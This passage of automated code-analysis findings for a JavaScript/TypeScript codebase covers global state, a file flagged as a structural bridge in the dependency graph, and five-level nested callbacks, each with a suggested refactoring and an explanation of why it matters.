findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Structural bridge: `test/development/app-dir/use-cache-errors/app/module-with-use-cache.ts` separates components of [35788, 11]
findings.description: `test/development/app-dir/use-cache-errors/app/module-with-use-cache.ts` is a structural bridge. Removing it would split the graph into components of sizes [35788, 11]. All communication between these components currently flows through this single node.
findings.suggested_fix: Reduce coupling through this node by introducing alternative call paths, extracting shared interfaces, or splitting the bridge function into independently accessible units.
findings.why_it_matters: A structural bridge is a single node whose failure disconnects entire subsystems. This creates fragile architecture where a bug, API change, or refactor in one function can cascade to all dependent components.

findings.title: Callback hell (5 levels deep)
findings.description:
Deeply nested callbacks (5 levels) make code hard to follow.

**Analysis:**
✓ File already uses async/await in some places
⚠️ 5 .then() chains detected
findings.suggested_fix:
This file already uses async/await. Convert remaining callbacks:
1. Replace `.then()` chains with `await`
2. Use `try/catch` instead of `.catch()`
findings.why_it_matters: The 'pyramid of doom' hurts readability and makes error handling difficult. Each nesting level increases cognitive load.
